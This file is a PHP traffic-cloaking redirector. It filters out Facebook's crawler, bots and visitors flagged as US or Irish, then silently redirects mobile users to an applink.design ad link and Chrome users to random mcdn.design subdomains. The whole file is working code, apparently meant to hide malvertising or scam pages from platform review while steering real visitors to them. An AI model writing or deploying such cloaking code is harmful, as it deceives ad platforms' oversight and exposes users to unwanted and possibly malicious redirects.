<?php
header_remove("X-Powered-By");
header("Content-Type:text/html; charset=utf-8");
function get_browser_name()
{
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
	elseif (strpos($user_agent, 'Edge')) return 'Edge';
	elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
	elseif (strpos($user_agent, 'Safari')) return 'Safari';
	elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
	elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';

	return 'Other';
}
if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
	$blocked = "bot";
}
if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
	$blocked = "bot";
}
if(strpos($_SERVER['HTTP_USER_AGENT'],"face") !== false){
	$blocked = "bot";
}
if(!isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
	$blocked = "bot";
}
if(isset($_SERVER['HTTP_X_PURPOSE']) || $_SERVER['HTTP_USER_AGENT'] == ''){
	$blocked = "bot";
}
if($_SERVER['HTTP_X_APPENGINE_COUNTRY'] == "US" || $_SERVER['HTTP_X_APPENGINE_COUNTRY'] == "IE"){
	$blocked = "bot";
}
$ads = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"><html><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-74374389-1"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date());gtag("config","UA-74374389-1");</script><meta http-equiv="refresh" content="0; url=http://applink.design/ad/d9ad487c"><title>Redirect</title></head><body></body></html>';
if($blocked == "bot"){
	exit();
}
if (preg_match('/^1207.*|^3gso.*|^4thp.*|^501i.*|^502i.*|^503i.*|^504i.*|^505i.*|^506i.*|.*Fennec.*|^6310.*|^6590.*|^770s.*|^802s.*|.*a100.*|.*a510.*|.*a511.*|^abac.*|^acer.*|^acoo.*|^acs.*|^aiko.*|^airn.*|.*alacatel.*|^alav.*|^alca.*|^alco.*|^amoi.*|^Amoi.*|.*android.*|^anex.*|^anny.*|^anyw.*|^aptu.*|^arch.*|^argo.*|^aste.*|^asus.*|^ASUS.*|^attw.*|^au.*|^audi.*|^Audiovox.*|^AU-MIC.*|^aur.*|^aus.*|^avan.*|^beck.*|^bell.*|^benq.*|^BenQ.*|^bilb.*|^bird.*|^Bird.*|^blac.*|.*BlackBerry.*|^blaz.*|.*Blazer.*|.*boxee.*|.*BRAVIA.*|^brew.*|^brvw.*|^bumb.*|^bw.*|^c55.*|^capi.*|^ccwa.*|^cdm.*|^CDM.*|.*CE-HTML.*|^cell.*|^chtm.*|^cldc.*|^cmd.*|^comp.*|^cond.*|.*CorePlayer.*|^craw.*|^dait.*|^dall.*|^dang.*|^dbte.*|^dc.*|.*dell streak.*|^devi.*|^dica.*|.*DLNA.*|.*DLNADOC.*|^dmob.*|^doco.*|^DoCoMo.*|^dopo.*|^dopod.*|^ds.*|^ds12.*|^el49.*|^elai.*|^eml2.*|^emul.*|^eric.*|.*Ericsson.*|^erk0.*|^esl8.*|^ez40.*|^ez60.*|^ez70.*|^ezos.*|^ezwa.*|^ezze.*|^fake.*|^fetc.*|^fly.*|.*FlyCast.*|.*foobar2000.*|^g1.*|^g560.*|^gene.*|^gf.*|^go.*|.*GomPlayer.*|^good.*|.*GoogleTV.*|^grad.*|^grun.*|^haie.*|^Haier.*|.*hbbtv.*|.*HbbTV.*|^hcit.*|^hd.*|^hei.*|^hipt.*|^hita.*|^HP.*|.*htc.*|^htca.*|^htcg.*|^htcp.*|^htcs.*|^htct.*|^http.*|^huaw.*|.*Huawei.*|^hutc.*|^i230.*|^iac.*|^ibro.*|^idea.*|.*iemobile.*|^ig01.*|^ikom.*|^im1k.*|^i-mobile.*|^inno.*|.*ipad.*|^ipaq.*|.*iPAQ.*|.*iphone.*|.*iPod.*|^iris.*|.*iTunes.*|^jata.*|^java.*|^jbro.*|^jemu.*|^jigs.*|^kddi.*|^KDDI.*|^keji.*|^kgt.*|.*kindle.*|^klon.*|^KONKA.*|^kpt.*|^kwc.*|^KWC.*|^kyoc.*|^kyok.*|.*Large Screen.*|^leno.*|^Lenovo.*|^lexi.*|^lg.*|^lg50.*|^lg54.*|^lge.*|^libw.*|^lynx.*|^m3ga.*|^m50.*|^mate.*|^maui.*|^maxo.*|^mc01.*|^mc21.*|^mcca.*|^medi.*|^merc.*|^meri.*|^midp.*|.*midp.*|.*mini.*|^mio8.*|^mioa.*|.*Miro.*|^mits.*|^mmef.*|^mo01.*|^mo02.*|^mobi.*|.*mobile.*|^mode.*|^modo.*|^mot.*|^motv.*|^mozz.*|.*MPlayer.*|.*MSN.*|^mt50.*|^mtp1.*|^mtv.*|^mwbp.*|^mywa.*|^n100.*|^n101.*|^n102.*|^n202.*|^n203.*|^n300.*|^n302.*|^n500.*|^n502.*|^n505.*|^n700.*|^n701.*|^n710.*|^nec.*|^NEC-.*|^nem.*|^neon.*|^netf.*|.*NETTV.*|^newg.*|^NEWGEN.*|^newt.*|.*Nexus 10.*|.*Nexus 7.*|.*Nintendo.*|^nok6.*|^noki.*|.*Nokia.*|.*Novarra.*|^nzph.*|^o2.*|.*o2.*|.*O2.*|^o2im.*|.*Opera.Mobi.*|^opti.*|^opwv.*|^oran.*|^owg1.*|^p800.*|.*Palm.*|^pana.*|^Panasonic.*|^pand.*|^pant.*|^PANTECH.*|^pdxg.*|^PG.*|^pg13.*|^phil.*|^Philips.*|^pire.*|^play.*|.*PLAYSTATION 3.*|.*Plex.*|^pluc.*|^pock.*|.*pocket.*|^port.*|^portalmmm.*|^pose.*|^PPC.*|^prox.*|.*PS3.*|^psio.*|.*psp.*|^qc07.*|^qc12.*|^qc21.*|^qc32.*|^qc60.*|^qci.*|^qtek.*|^Qtek.*|.*QuickTime.*|^qwap.*|^r380.*|^r600.*|^raks.*|^rim9.*|^rove.*|^rozo.*|^s55.*|^sage.*|^Sagem.*|^SAGEM.*|^sama.*|^samm.*|^sams.*|.*SAMSUNG.*|^sany.*|.*Sanyo.*|^sava.*|^sc01.*|^sch.*|^SCH.*|.*SCH-.*|.*sch-i800.*|^scoo.*|^scp.*|^sdk.*|^se47.*|^sec.*|^SEC.*|^sec0.*|^sec1.*|^semc.*|.*SEMC-Browser.*|^send.*|^Sendo.*|^seri.*|^sgh.*|^SGH.*|.*SGH-.*|.*sgh-t849.*|^shar.*|^Sharp.*|.*shw-m180s.*|^sie.*|^SIE.*|^siem.*|^SIEMENS.*|.*silk.*|^sl45.*|^slid.*|^smal.*|^smar.*|.*Smarthub.*|.*smartphone.*|.*SmartTV.*|.*SMART-TV.*|^smb3.*|^smit.*|^smt5.*|^soft.*|^SoftBank.*|^sony.*|^SonyEricsson|^SonyEricsson.*|.*SonyEricsson.*|^sp01.*|^sph.*|^SPH.*|^spv.*|^sy01.*|^symb.*|.*symbian.*|.*SymbianOS.*|^t218.*|^t250.*|^t600.*|^t610.*|^t618.*|.*tablet.*|^tagt.*|^talk.*|^tcl.*|^tdg.*|.*teleca.*|^teli.*|^telm.*|^tim.*|^topl.*|^tosh.*|.*Toshiba.*|.*treo.*|^ts70.*|^tsm.*|^tsm3.*|^tsm5.*|.*up\.browser.*|^upg1.*|.*up\.link.*|.*UPnP.*|^upsi.*|^UTS.*|^utst.*|^v400.*|^v750.*|^veri.*|^Vertu.*|^virg.*|^vite.*|^vk40.*|^vk50.*|^vk52.*|^vk53.*|.*VLC media player.*|^vm40.*|^voda.*|.*vodafone.*|^vulc.*|^vx52.*|^vx53.*|^vx60.*|^vx61.*|^vx70.*|^vx80.*|^vx81.*|^vx83.*|^vx85.*|^vx98.*|^w3c.*|.*WAFA.*|^wap.*|.*wap.*|^wapa.*|^wapi.*|^wapj.*|^wapm.*|^wapp.*|^wapr.*|^waps.*|^wapt.*|^wapu.*|^wapv.*|^wapy.*|^webc.*|.*webOS.*|.*WebTV.*|^whit.*|.*BOLT.*|^wig.*|.*wii.*|^winc.*|.*windows ce.*|.*Windows.CE.*|.*Windows-Media-Player.*|.*WindowsPhone.*|.*Windows Phone.*|^winw.*|^wmlb.*|^wonu.*|^x700.*|.*XBMC.*|.*xbox.*|^xda.*|.*Xda.*|^xda2.*|^xdag.*|^yas.*|^your.*|^zeto.*|^ZTE.*/i', $_SERVER['HTTP_USER_AGENT'])) {
	echo $ads;
} else {
	if (get_browser_name() == 'Chrome') {
		header("Location: http://".md5(rand()).".mcdn.design/".md5(rand()));
	} else {
		echo $ads;
	}
}
